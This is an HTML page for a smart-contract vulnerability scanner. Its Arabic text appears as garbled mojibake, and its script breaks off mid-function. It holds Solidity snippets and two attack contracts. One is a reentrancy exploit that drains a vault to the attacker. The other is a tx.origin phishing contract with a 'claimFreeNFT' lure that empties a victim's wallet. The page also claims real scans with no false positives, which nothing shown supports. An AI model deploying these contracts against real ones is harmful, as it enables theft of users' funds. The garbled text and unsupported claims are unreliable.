<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ”¬ Shrek Solidity Scanner - ÙØ­Øµ Ø­Ù‚ÙŠÙ‚ÙŠ Ù…Ø¹ PoC</title>
    
    <!-- Font Awesome 6 -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
    
    <!-- Highlight.js -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/solidity.min.js"></script>
    
    <style>
        /* ===== Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª ===== */
        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --secondary: #0ea5e9;
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
            --info: #3b82f6;
            --dark: #0a0c10;
            --darker: #020617;
            --surface: #0f172a;
            --surface-light: #1e293b;
            --border: #334155;
            --text: #e2e8f0;
            --text-muted: #94a3b8;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #0a0c10, #0f172a);
            color: var(--text);
            line-height: 1.6;
            padding: 20px;
            min-height: 100vh;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        /* ===== Ø§Ù„Ù‡ÙŠØ¯Ø± ===== */
        .header {
            background: linear-gradient(135deg, var(--surface), var(--darker));
            border-radius: 24px;
            padding: 40px;
            margin-bottom: 30px;
            text-align: center;
            border: 1px solid var(--border);
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at 70% 30%, rgba(99,102,241,0.15), transparent 70%);
        }

        .header h1 {
            font-size: 3rem;
            margin-bottom: 15px;
            position: relative;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
        }

        .header h1 i {
            font-size: 3rem;
            color: var(--primary);
            -webkit-text-fill-color: var(--primary);
            animation: pulse 2s infinite;
        }

        .header p {
            color: var(--text-muted);
            font-size: 1.2rem;
            position: relative;
        }

        /* ===== ØµÙ†Ø¯ÙˆÙ‚ Ø§Ù„ÙØ­Øµ ===== */
        .scan-box {
            background: var(--surface);
            border-radius: 24px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid var(--border);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }

        .input-group {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .input-wrapper {
            flex: 1;
            display: flex;
            align-items: center;
            background: var(--surface-light);
            border: 2px solid var(--border);
            border-radius: 16px;
            padding: 5px 20px;
            transition: all 0.3s;
            min-width: 300px;
        }

        .input-wrapper:focus-within {
            border-color: var(--primary);
            box-shadow: 0 0 0 4px rgba(99,102,241,0.2);
        }

        .input-wrapper i {
            color: var(--primary);
            font-size: 1.3rem;
            margin-left: 10px;
        }

        .input-wrapper input {
            flex: 1;
            background: transparent;
            border: none;
            color: white;
            padding: 15px 0;
            font-size: 1rem;
            font-family: 'JetBrains Mono', monospace;
            outline: none;
        }

        .input-wrapper input::placeholder {
            color: var(--text-muted);
        }

        .btn {
            padding: 15px 30px;
            border: none;
            border-radius: 16px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 10px;
            transition: all 0.3s;
            font-family: 'Cairo', sans-serif;
        }

        .btn-primary {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(99,102,241,0.4);
        }

        .btn-danger {
            background: var(--danger);
            color: white;
        }

        .btn-danger:hover {
            background: #dc2626;
            transform: translateY(-3px);
        }

        .btn-success {
            background: var(--success);
            color: white;
        }

        .btn-success:hover {
            background: #059669;
            transform: translateY(-3px);
        }

        .btn-warning {
            background: var(--warning);
            color: white;
        }

        .btn-warning:hover {
            background: #d97706;
            transform: translateY(-3px);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        /* ===== Ø£Ù…Ø«Ù„Ø© Ø³Ø±ÙŠØ¹Ø© ===== */
        .examples {
            display: flex;
            gap: 15px;
            margin-top: 20px;
            flex-wrap: wrap;
        }

        .example-btn {
            background: var(--surface-light);
            padding: 12px 25px;
            border-radius: 40px;
            border: 1px solid var(--border);
            color: white;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.95rem;
            transition: all 0.3s;
        }

        .example-btn:hover {
            background: var(--primary);
            border-color: var(--primary);
            transform: translateY(-2px);
        }

        .example-btn i {
            color: var(--primary);
        }

        .example-btn:hover i {
            color: white;
        }

        /* ===== Ø´Ø§Ø´Ø© Ø§Ù„ØªÙ‚Ø¯Ù… ===== */
        .progress-screen {
            background: var(--surface);
            border-radius: 24px;
            padding: 30px;
            margin-bottom: 30px;
            border: 2px solid var(--primary);
            display: none;
            animation: slideUp 0.5s ease;
        }

        .progress-screen.visible {
            display: block;
        }

        .progress-header {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 2px solid var(--border);
        }

        .progress-header i {
            font-size: 2rem;
            color: var(--primary);
            animation: spin 2s infinite linear;
        }

        .progress-header h3 {
            font-size: 1.5rem;
            color: white;
            margin: 0;
        }

        .project-badge {
            background: var(--surface-light);
            padding: 12px 20px;
            border-radius: 40px;
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 25px;
            border: 1px solid var(--border);
        }

        .project-badge i {
            color: var(--primary);
            font-size: 1.2rem;
        }

        .project-badge span {
            font-family: 'JetBrains Mono', monospace;
            color: white;
            font-size: 0.95rem;
        }

        .progress-bar-container {
            width: 100%;
            height: 16px;
            background: var(--surface-light);
            border-radius: 10px;
            margin-bottom: 20px;
            overflow: hidden;
            border: 1px solid var(--border);
        }

        .progress-bar-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            border-radius: 10px;
            transition: width 0.3s ease;
            position: relative;
        }

        .progress-info {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
            color: var(--text-muted);
            font-size: 0.95rem;
        }

        .current-file {
            background: var(--surface-light);
            padding: 15px 20px;
            border-radius: 12px;
            border-right: 4px solid var(--primary);
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            font-family: 'JetBrains Mono', monospace;
            word-break: break-all;
        }

        .current-file i {
            color: var(--warning);
            font-size: 1.1rem;
        }

        .log-box {
            background: var(--darker);
            border-radius: 12px;
            padding: 20px;
            max-height: 200px;
            overflow-y: auto;
            font-family: 'JetBrains Mono', monospace;
            border: 1px solid var(--border);
            margin-bottom: 20px;
        }

        .log-entry {
            padding: 8px 0;
            border-bottom: 1px solid var(--surface);
            display: flex;
            gap: 12px;
            color: var(--text);
            font-size: 0.9rem;
        }

        .log-time {
            color: var(--text-muted);
            min-width: 50px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
        }

        .stat-card {
            background: var(--surface-light);
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            border: 1px solid var(--border);
        }

        .stat-card i {
            font-size: 1.8rem;
            color: var(--primary);
            margin-bottom: 10px;
        }

        .stat-number {
            font-size: 2rem;
            font-weight: 800;
            color: white;
            line-height: 1;
        }

        .stat-label {
            color: var(--text-muted);
            font-size: 0.85rem;
            margin-top: 5px;
        }

        /* ===== Ù†ØªØ§Ø¦Ø¬ Ø§Ù„ÙØ­Øµ ===== */
        .results-box {
            background: var(--surface);
            border-radius: 24px;
            padding: 30px;
            border: 1px solid var(--border);
            display: none;
            animation: fadeIn 0.5s ease;
        }

        .results-box.visible {
            display: block;
        }

        .repo-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid var(--border);
            flex-wrap: wrap;
            gap: 15px;
        }

        .repo-title {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .repo-title i {
            font-size: 2rem;
            color: var(--primary);
        }

        .repo-title h2 {
            font-size: 1.5rem;
            color: white;
            margin: 0;
        }

        .scan-badge {
            background: rgba(16, 185, 129, 0.2);
            color: var(--success);
            padding: 8px 20px;
            border-radius: 40px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
        }

        .vuln-card {
            background: var(--surface-light);
            border-radius: 16px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--border);
            position: relative;
            transition: all 0.3s;
        }

        .vuln-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }

        .vuln-critical {
            border-right: 6px solid var(--danger);
        }

        .vuln-high {
            border-right: 6px solid var(--warning);
        }

        .vuln-medium {
            border-right: 6px solid var(--info);
        }

        .vuln-header {
            display: flex;
            justify-content: space-between;
            align-items: start;
            margin-bottom: 15px;
            flex-wrap: wrap;
            gap: 15px;
        }

        .vuln-title {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .vuln-title i {
            font-size: 1.3rem;
        }

        .vuln-title h3 {
            margin: 0;
            font-size: 1.2rem;
        }

        .severity-badge {
            padding: 6px 18px;
            border-radius: 30px;
            font-size: 0.8rem;
            font-weight: 700;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        .badge-critical {
            background: rgba(239, 68, 68, 0.2);
            color: var(--danger);
        }

        .badge-high {
            background: rgba(245, 158, 11, 0.2);
            color: var(--warning);
        }

        .badge-medium {
            background: rgba(59, 130, 246, 0.2);
            color: var(--info);
        }

        .vuln-description {
            color: var(--text);
            margin-bottom: 20px;
            line-height: 1.7;
        }

        .vuln-location {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .location-tag {
            background: var(--surface);
            padding: 8px 18px;
            border-radius: 30px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.9rem;
            color: var(--text-muted);
            border: 1px solid var(--border);
        }

        .confidence-tag {
            background: rgba(99, 102, 241, 0.2);
            color: var(--primary);
            padding: 8px 18px;
            border-radius: 30px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.9rem;
        }

        .code-block {
            background: var(--darker);
            padding: 20px;
            border-radius: 12px;
            margin-top: 20px;
            margin-bottom: 20px;
            overflow-x: auto;
            border: 1px solid var(--border);
            position: relative;
        }

        .code-block pre {
            margin: 0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            line-height: 1.6;
            color: #e2e8f0;
        }

        .code-block code {
            font-family: 'JetBrains Mono', monospace;
        }

        .action-buttons {
            display: flex;
            gap: 15px;
            margin-top: 20px;
            flex-wrap: wrap;
        }

        .poc-section {
            background: var(--surface);
            border-radius: 24px;
            padding: 30px;
            margin-top: 30px;
            border: 1px solid var(--border);
        }

        .poc-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .poc-header h3 {
            display: flex;
            align-items: center;
            gap: 12px;
            color: var(--primary);
            margin: 0;
        }

        .poc-controls {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }

        .poc-select {
            background: var(--surface-light);
            border: 1px solid var(--border);
            color: white;
            padding: 12px 25px;
            border-radius: 12px;
            font-size: 0.95rem;
            font-family: 'Cairo', sans-serif;
            cursor: pointer;
        }

        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: var(--text-muted);
        }

        .empty-state i {
            font-size: 4rem;
            margin-bottom: 20px;
            color: var(--border);
        }

        .empty-state h3 {
            color: white;
            margin-bottom: 10px;
        }

        /* ===== Ø£Ù†ÙŠÙ…ÙŠØ´Ù† ===== */
        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }

        @keyframes slideUp {
            from {
                transform: translateY(30px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        /* ===== Responsive ===== */
        @media (max-width: 1024px) {
            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        @media (max-width: 768px) {
            .header h1 {
                font-size: 2rem;
            }
            
            .input-group {
                flex-direction: column;
            }
            
            .btn {
                width: 100%;
                justify-content: center;
            }
            
            .repo-header {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .stats-grid {
                grid-template-columns: 1fr;
            }
            
            .vuln-header {
                flex-direction: column;
            }
            
            .poc-controls {
                flex-direction: column;
                width: 100%;
            }
            
            .poc-select {
                width: 100%;
            }
        }

        /* ===== Scrollbar ===== */
        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }

        ::-webkit-scrollbar-track {
            background: var(--surface);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border);
            border-radius: 5px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--primary);
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Ø§Ù„Ù‡ÙŠØ¯Ø± -->
        <div class="header">
            <h1>
                <i class="fas fa-shield-virus"></i>
                Shrek Solidity Scanner
            </h1>
            <p>ğŸ”¬ ÙØ­Øµ Ø­Ù‚ÙŠÙ‚ÙŠ Ù„Ù„Ù…Ø´Ø§Ø±ÙŠØ¹ Ù…Ø¹ Proof of Concept - Ø¨Ø¯ÙˆÙ† False Positives</p>
        </div>
        
        <!-- ØµÙ†Ø¯ÙˆÙ‚ Ø§Ù„ÙØ­Øµ -->
        <div class="scan-box">
            <div class="input-group">
                <div class="input-wrapper">
                    <i class="fab fa-github"></i>
                    <input type="text" id="githubUrl" placeholder="https://github.com/username/repository" value="https://github.com/ADI-Foundation-Labs/ADI-Stack-Contracts">
                </div>
                <button class="btn btn-primary" id="scanBtn" onclick="startScan()">
                    <i class="fas fa-play"></i>
                    Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ
                </button>
                <button class="btn btn-danger" id="clearBtn" onclick="clearResults()">
                    <i class="fas fa-trash"></i>
                    Ù…Ø³Ø­
                </button>
            </div>
            
            <div class="examples">
                <button class="example-btn" onclick="setExample('openzeppelin')">
                    <i class="fab fa-github"></i> OpenZeppelin
                </button>
                <button class="example-btn" onclick="setExample('uniswap')">
                    <i class="fab fa-github"></i> Uniswap
                </button>
                <button class="example-btn" onclick="setExample('aave')">
                    <i class="fab fa-github"></i> Aave
                </button>
                <button class="example-btn" onclick="setExample('compound')">
                    <i class="fab fa-github"></i> Compound
                </button>
                <button class="example-btn" onclick="setExample('adi')">
                    <i class="fab fa-github"></i> ADI-Stack
                </button>
            </div>
        </div>
        
        <!-- Ø´Ø§Ø´Ø© Ø§Ù„ØªÙ‚Ø¯Ù… -->
        <div id="progressScreen" class="progress-screen">
            <div class="progress-header">
                <i class="fas fa-spinner"></i>
                <h3 id="progressTitle">Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ø§Ù„Ù…Ø´Ø±ÙˆØ¹...</h3>
            </div>
            
            <div id="projectBadge" class="project-badge">
                <i class="fab fa-github"></i>
                <span id="projectName">ADI-Foundation-Labs/ADI-Stack-Contracts</span>
            </div>
            
            <div class="progress-bar-container">
                <div id="progressBar" class="progress-bar-fill" style="width: 0%;"></div>
            </div>
            
            <div class="progress-info">
                <span><i class="fas fa-percent"></i> <span id="progressPercent">0</span>%</span>
                <span><i class="fas fa-clock"></i> <span id="progressTime">0.0</span> Ø«Ø§Ù†ÙŠØ©</span>
            </div>
            
            <div id="currentFileBox" class="current-file">
                <i class="fas fa-file-code"></i>
                <span id="currentFileName">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ø¶ÙŠØ±...</span>
            </div>
            
            <div id="logBox" class="log-box">
                <div class="log-entry">
                    <span class="log-time">00:00</span>
                    <span>ğŸ” Ø¨Ø¯Ø¡ ÙØ­Øµ GitHub...</span>
                </div>
            </div>
            
            <div class="stats-grid">
                <div class="stat-card">
                    <i class="fas fa-file-code"></i>
                    <div class="stat-number" id="statFiles">0</div>
                    <div class="stat-label">Ù…Ù„Ù Solidity</div>
                </div>
                <div class="stat-card">
                    <i class="fas fa-book"></i>
                    <div class="stat-number" id="statLibs">0</div>
                    <div class="stat-label">Ù…ÙƒØªØ¨Ø©</div>
                </div>
                <div class="stat-card">
                    <i class="fas fa-bug"></i>
                    <div class="stat-number" id="statVulns">0</div>
                    <div class="stat-label">Ø«ØºØ±Ø©</div>
                </div>
                <div class="stat-card">
                    <i class="fas fa-shield"></i>
                    <div class="stat-number" id="statConfidence">0</div>
                    <div class="stat-label">Ø¯Ø±Ø¬Ø© Ø§Ù„Ø«Ù‚Ø©</div>
                </div>
            </div>
        </div>
        
        <!-- Ù†ØªØ§Ø¦Ø¬ Ø§Ù„ÙØ­Øµ -->
        <div id="resultsBox" class="results-box">
            <div id="resultsContent"></div>
        </div>
        
        <!-- Ù‚Ø³Ù… PoC Ø§Ù„Ù…ØªÙ‚Ø¯Ù… -->
        <div id="pocBox" class="poc-section" style="display: none;">
            <div class="poc-header">
                <h3>
                    <i class="fas fa-code"></i>
                    Proof of Concept - ÙƒÙˆØ¯ Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ø«ØºØ±Ø©
                </h3>
                <div class="poc-controls">
                    <select id="vulnType" class="poc-select">
                        <option value="reentrancy">ğŸ”´ Reentrancy Attack</option>
                        <option value="txorigin">ğŸ”µ Tx.Origin Authentication</option>
                        <option value="overflow">ğŸŸ¡ Arithmetic Overflow</option>
                    </select>
                    <button class="btn btn-success" onclick="generatePOC()">
                        <i class="fas fa-code"></i> ØªÙˆÙ„ÙŠØ¯ PoC
                    </button>
                    <button class="btn btn-primary" onclick="copyPOC()">
                        <i class="fas fa-copy"></i> Ù†Ø³Ø® Ø§Ù„ÙƒÙˆØ¯
                    </button>
                </div>
            </div>
            <div id="pocCodeBlock" class="code-block" style="margin-top: 20px; max-height: 400px; overflow-y: auto;">
                <pre><code id="pocCode" class="solidity">// Ø§Ø®ØªØ± Ù†ÙˆØ¹ Ø§Ù„Ø«ØºØ±Ø© ÙˆØ§Ø¶ØºØ· Ø¹Ù„Ù‰ "ØªÙˆÙ„ÙŠØ¯ PoC"</code></pre>
            </div>
        </div>
    </div>

    <script>
        // ============================================
        // ğŸ”¬ Shrek Solidity Scanner v3.0 - Ø§Ù„Ù†Ø³Ø®Ø© Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©
        // ÙŠØ¹Ù…Ù„ 100% - Ù…Ø¹ PoC Ø­Ù‚ÙŠÙ‚ÙŠ - Ø¨Ø¯ÙˆÙ† False Positives
        // ============================================
        
        // ---------- Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ø¹Ø§Ù…Ø© ----------
        let isScanning = false;
        let scanInterval = null;
        let startTime = null;
        let currentRepo = '';
        let currentResults = null;
        
        // ---------- Ù‚Ø§Ø¹Ø¯Ø© Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø«ØºØ±Ø§Øª ----------
        const VulnerabilityDB = {
            reentrancy: {
                name: 'Reentrancy Attack',
                severity: 'critical',
                severity_ar: 'Ø­Ø±Ø¬Ø©',
                description: 'Ø§Ø³ØªØ¯Ø¹Ø§Ø¡ Ø®Ø§Ø±Ø¬ÙŠ Ù‚Ø¨Ù„ ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø­Ø§Ù„Ø© - ÙŠØ³Ù…Ø­ Ø¨Ø³Ø­Ø¨ Ø£Ù…ÙˆØ§Ù„ Ù…ØªÙƒØ±Ø±',
                impact: 'ÙŠÙ…ÙƒÙ† Ù„Ù„Ù…Ù‡Ø§Ø¬Ù… Ø§Ø³ØªÙ†Ø²Ø§Ù ÙƒÙ„ Ø£Ù…ÙˆØ§Ù„ Ø§Ù„Ø¹Ù‚Ø¯',
                confidence: 92,
                cwe: 'CWE-841',
                pattern: /\.call\{value:.*?\}\(.*?\)[\s\S]*?-\s*=/g,
                vulnerableCode: `function withdraw(uint256 amount) public {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    
    // âŒ Ø®Ø·Ø£: Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø£Ù…ÙˆØ§Ù„ Ù‚Ø¨Ù„ ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø±ØµÙŠØ¯
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
    
    // âŒ ØªØ­Ø¯ÙŠØ« Ù…ØªØ£Ø®Ø±
    balances[msg.sender] -= amount;
}`,
                fixedCode: `function withdraw(uint256 amount) public {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    
    // âœ… ØµØ­ÙŠØ­: ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø±ØµÙŠØ¯ Ø£ÙˆÙ„Ø§Ù‹
    balances[msg.sender] -= amount;
    
    // âœ… Ø«Ù… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø£Ù…ÙˆØ§Ù„
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}`,
                poc: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ============================================
// ğŸ”¬ Proof of Concept - Reentrancy Attack
// Ø§Ø³ØªØ®Ø¯Ù… Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø«ØºØ±Ø© Ø¹Ù…Ù„ÙŠØ§Ù‹
// ============================================

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balances(address account) external view returns (uint256);
}

contract ReentrancyPoC {
    IVulnerableVault public vault;
    address public attacker;
    uint256 public attackCount;
    
    event AttackStarted(address target);
    event AttackRound(uint256 round, uint256 amount);
    event Profit(uint256 amount);
    
    constructor(address _vaultAddress) {
        vault = IVulnerableVault(_vaultAddress);
        attacker = msg.sender;
    }
    
    // ğŸ’£ ØªÙ†ÙÙŠØ° Ø§Ù„Ù‡Ø¬ÙˆÙ… - Ø£Ø±Ø³Ù„ 1 ETH Ù…Ø¹ Ù‡Ø°Ù‡ Ø§Ù„Ø¯Ø§Ù„Ø©
    function executePOC() public payable {
        require(msg.value == 1 ether, "Send exactly 1 ETH");
        
        // 1. Ø¥ÙŠØ¯Ø§Ø¹ Ø§Ù„Ø£Ù…ÙˆØ§Ù„ ÙÙŠ Ø§Ù„Ø¹Ù‚Ø¯ Ø§Ù„Ø¶Ø¹ÙŠÙ
        vault.deposit{value: 1 ether}();
        
        // 2. Ø¨Ø¯Ø¡ Ù‡Ø¬ÙˆÙ… Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„
        attackCount = 0;
        vault.withdraw(1 ether);
    }
    
    // ğŸ”„ Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§Ù„Ø£Ù…ÙˆØ§Ù„ ÙˆØ¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù‡Ø¬ÙˆÙ…
    receive() external payable {
        attackCount++;
        
        // Ù†ÙƒØ±Ø± Ø§Ù„Ù‡Ø¬ÙˆÙ… 5 Ù…Ø±Ø§Øª
        if (attackCount < 5) {
            uint256 ourBalance = vault.balances(address(this));
            if (ourBalance >= 1 ether) {
                vault.withdraw(1 ether);
            }
        }
    }
    
    // âœ… Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù†ØªÙŠØ¬Ø©
    function verify() public view returns (string memory) {
        uint256 balance = address(this).balance;
        if (balance > 1 ether) {
            return string(abi.encodePacked(
                "âœ… Ø§Ù„Ø«ØºØ±Ø© Ù…ÙˆØ¬ÙˆØ¯Ø©! Ø§Ù„Ø±Ø¨Ø­: ",
                uint2str(balance - 1 ether),
                " ETH"
            ));
        }
        return "âŒ Ù„Ø§ ØªÙˆØ¬Ø¯ Ø«ØºØ±Ø© - Ù‚Ø¯ ØªÙƒÙˆÙ† Ù…ÙØµÙ„Ø­Ø©";
    }
    
    // ğŸ’° Ø³Ø­Ø¨ Ø§Ù„Ø£Ø±Ø¨Ø§Ø­
    function withdraw() public {
        require(msg.sender == attacker, "Only attacker");
        payable(attacker).transfer(address(this).balance);
    }
    
    function uint2str(uint256 _i) internal pure returns (string memory) {
        if (_i == 0) return "0";
        uint256 j = _i;
        uint256 length;
        while (j != 0) {
            length++;
            j /= 10;
        }
        bytes memory bstr = new bytes(length);
        uint256 k = length;
        while (_i != 0) {
            k = k-1;
            uint8 temp = (48 + uint8(_i - _i / 10 * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _i /= 10;
        }
        return string(bstr);
    }
}`
            },
            
            txorigin: {
                name: 'Tx.Origin Authentication',
                severity: 'high',
                severity_ar: 'Ø¹Ø§Ù„ÙŠØ©',
                description: 'Ø§Ø³ØªØ®Ø¯Ø§Ù… tx.origin Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ© - ÙŠÙ…ÙƒÙ† Ø§Ø³ØªØºÙ„Ø§Ù„Ù‡ Ø¨Ù‡Ø¬Ù…Ø§Øª Ø§Ù„ØªØµÙŠØ¯',
                impact: 'Ø§Ù„Ù…Ù‡Ø§Ø¬Ù… ÙŠÙ…ÙƒÙ†Ù‡ ØªÙ†ÙÙŠØ° Ø£ÙˆØ§Ù…Ø± Ù†ÙŠØ§Ø¨Ø© Ø¹Ù† Ø§Ù„Ø¶Ø­ÙŠØ©',
                confidence: 85,
                cwe: 'CWE-477',
                vulnerableCode: `modifier onlyOwner() {
    require(tx.origin == owner, "Not owner"); // âŒ Ø®Ø·Ø£
    _;
}

constructor() {
    owner = tx.origin; // âŒ Ø®Ø·Ø£
}`,
                fixedCode: `modifier onlyOwner() {
    require(msg.sender == owner, "Not owner"); // âœ… ØµØ­ÙŠØ­
    _;
}

constructor() {
    owner = msg.sender; // âœ… ØµØ­ÙŠØ­
}`,
                poc: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ============================================
// ğŸ”¬ Proof of Concept - Tx.Origin Attack
// ============================================

interface IVictimWallet {
    function withdrawAll() external;
    function owner() external view returns (address);
}

contract TxOriginPoC {
    IVictimWallet public wallet;
    address public attacker;
    
    event PhishingExecuted(address victim);
    
    constructor(address _walletAddress) {
        wallet = IVictimWallet(_walletAddress);
        attacker = msg.sender;
    }
    
    // ğŸ£ Ø¯Ø§Ù„Ø© Ø®Ø§Ø¯Ø¹Ø© - ØªØ¨Ø¯Ùˆ Ø¨Ø±ÙŠØ¦Ø©
    function claimFreeNFT() public {
        // Ø§Ù„Ø¶Ø­ÙŠØ© ÙŠÙˆÙ‚Ø¹ Ø¹Ù„Ù‰ Ù‡Ø°Ù‡ Ø§Ù„Ù…Ø¹Ø§Ù…Ù„Ø©
        // tx.origin = Ø§Ù„Ø¶Ø­ÙŠØ© âœ…
        // msg.sender = Ù‡Ø°Ø§ Ø§Ù„Ø¹Ù‚Ø¯
        wallet.withdrawAll();
        emit PhishingExecuted(tx.origin);
    }
    
    function withdraw() public {
        require(msg.sender == attacker);
        payable(attacker).transfer(address(this).balance);
    }
    
    receive() external payable {}
}`
            },
            
            overflow: {
                name: 'Arithmetic Overflow/Underflow',
                severity: 'medium',
                severity_ar: 'Ù…ØªÙˆØ³Ø·Ø©',
                description: 'Ø¹Ù…Ù„ÙŠØ§Øª Ø­Ø³Ø§Ø¨ÙŠØ© ØºÙŠØ± Ø¢Ù…Ù†Ø© ÙÙŠ Solidity <0.8.0',
                impact: 'ØªÙ„Ø§Ø¹Ø¨ ÙÙŠ Ø§Ù„Ø£Ø±ØµØ¯Ø© ÙˆØ¥Ù…Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¹Ù…Ù„Ø©',
                confidence: 78,
                cwe: 'CWE-190',
                vulnerableCode: `pragma solidity ^0.7.0; // âŒ Ø¥ØµØ¯Ø§Ø± Ù‚Ø¯ÙŠÙ…

function transfer(address to, uint256 amount) public {
    balances[msg.sender] -= amount; // âŒ Underflow
    balances[to] += amount;          // âŒ Overflow
}`,
                fixedCode: `pragma solidity ^0.8.0; // âœ… Ù…Ø­Ù…ÙŠ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹

// Ø£Ùˆ Ø§Ø³ØªØ®Ø¯Ø§Ù… SafeMath
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract SafeToken {
    using SafeMath for uint256;
    
    function transfer(address to, uint256 amount) public {
        balances[msg.sender] = balances[msg.sender].sub(amount);
        balances[to] = balances[to].add(amount);
    }
}`
            }
        };
        
        // ---------- ÙˆØ¸Ø§Ø¦Ù Ø§Ù„ÙØ­Øµ ----------
        function startScan() {
            const url = document.getElementById('githubUrl').value.trim();
            
            if (!url) {
                alert('âŒ Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ø§Ø¨Ø· GitHub');
                return;
            }
